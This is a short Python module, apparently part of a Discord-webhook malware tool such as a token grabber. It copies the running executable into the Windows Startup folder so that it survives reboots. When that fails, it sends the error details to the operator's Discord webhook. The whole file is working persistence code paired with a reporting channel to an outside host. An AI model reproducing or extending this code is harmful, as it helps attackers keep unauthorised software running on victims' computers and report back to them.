import os
from dhooks import Embed
from config import Config
from __webhook import _WebhookX

class Startup:
    def __init__(self):
        self.roaming = os.getenv("appdata")
        self.startup_loc = os.path.join(self.roaming, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

    def send_error_notification(self, exception):
        cc = Config()
        webx = _WebhookX().get_object()

        embed = Embed(
            description='Error while copying to startup',
            color=16399677,
            timestamp='now'
        )

        embed.set_author(name=cc.get_name(), icon_url=cc.get_avatar())
        embed.set_footer(text=cc.get_footer(), icon_url=cc.get_avatar())
        embed.add_field(name="Couldn't copy to startup | Help us by reporting this bug",
                        value=f'Advanced Log: ```{exception}```')

        webx.send(embed=embed)

    def copy_to_startup(self):
        try:
            from sys import argv
            import shutil
            shutil.copy(argv[0], self.startup_loc)
        except Exception as e:
            self.send_error_notification(e)
